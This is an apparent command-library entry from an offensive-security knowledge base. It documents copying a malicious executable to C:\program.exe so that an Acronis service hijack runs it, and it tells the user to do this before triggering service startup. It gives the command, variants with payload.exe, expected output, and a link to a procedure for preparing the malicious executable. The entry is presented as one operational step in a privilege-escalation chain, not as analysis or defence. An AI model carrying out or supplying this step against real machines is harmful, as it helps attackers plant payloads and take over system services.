---
id: copy-exe-to-c-drive
data: 'copy malicious.exe C:\program.exe'
tags:
  - file-copy
  - hijack-setup
type: command
output: 1 file(s) copied.
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:52.218Z'
verified: false
validated: true
submitted: true
---
# copy-malicious-exe

## Command

```cmd
copy malicious.exe C:\program.exe
```

## Description

Copies a malicious executable to the C:\ root as 'program.exe' to enable hijacking by the Acronis service. Use this before triggering the service startup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| source | Path to source EXE (e.g., malicious.exe) | Yes |
| destination | Target path C:\program.exe | Yes |

## Examples

### Basic Usage

```cmd
copy payload.exe C:\program.exe
```

### With Verification

```cmd
copy payload.exe C:\program.exe && echo "Copied successfully"
```

## Expected Output

'1 file(s) copied.' if successful; error if no write access.

## Related

- [[commands/dir-c-drive]]
- [[procedures/Prepare-Malicious-Executable-for-Hijacking]]
